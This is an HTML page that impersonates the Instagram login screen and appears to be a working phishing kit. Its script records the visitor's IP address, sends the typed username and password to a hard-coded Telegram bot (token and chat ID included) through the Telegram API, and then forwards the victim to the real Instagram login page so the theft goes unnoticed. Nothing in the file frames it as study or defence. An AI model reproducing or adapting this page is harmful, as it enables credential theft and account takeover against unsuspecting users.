<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Helvetica', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px;
            text-align: center;
        }
        .logo img {
            width: 175px;
            margin-bottom: 20px;
        }
        .facebook-button {
            background-color: #0095f6;
            color: white;
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .facebook-button:hover {
            background-color: #007bb5;
        }
        .divider {
            margin: 20px 0;
            color: #8e8e8e;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #8e8e8e;
            border-radius: 5px;
            background-color: #121212;
            color: white;
            font-size: 14px;
        }
        input::placeholder {
            color: #8e8e8e;
        }
        .login-button {
            background-color: #0095f6;
            color: white;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }
        .login-button:hover {
            background-color: #007bb5;
        }
        .forgot-password {
            margin: 10px 0;
            color: #0095f6;
            font-size: 14px;
            text-decoration: none;
        }
        .signup-link {
            color: #0095f6;
            text-decoration: none;
        }
        .footer {
            margin-top: 30px;
            color: #8e8e8e;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Instagram Logo -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>

        <!-- Continue with Facebook -->
        <button class="facebook-button">Continue with Facebook</button>

        <!-- Divider -->
        <div class="divider">OR</div>

        <!-- Login Form -->
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button class="login-button" onclick="sendData()">Log In</button>

        <a href="#" class="forgot-password">Forgot password?</a>

        <div class="footer">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>
    </div>

    <script>
        let ipAddress = "Unknown IP";

        async function fetchIP() {
            try {
                await fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        ipAddress = data.ip;
                    });
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        fetchIP();

        function sendData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username.trim() === "" || password.trim() === "") {
                alert("Please fill in both fields.");
                return;
            }

            const message = `New Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;

            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
            const chatId = '860517021';  // Your chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            });
        }
    </script>

</body>
</html>
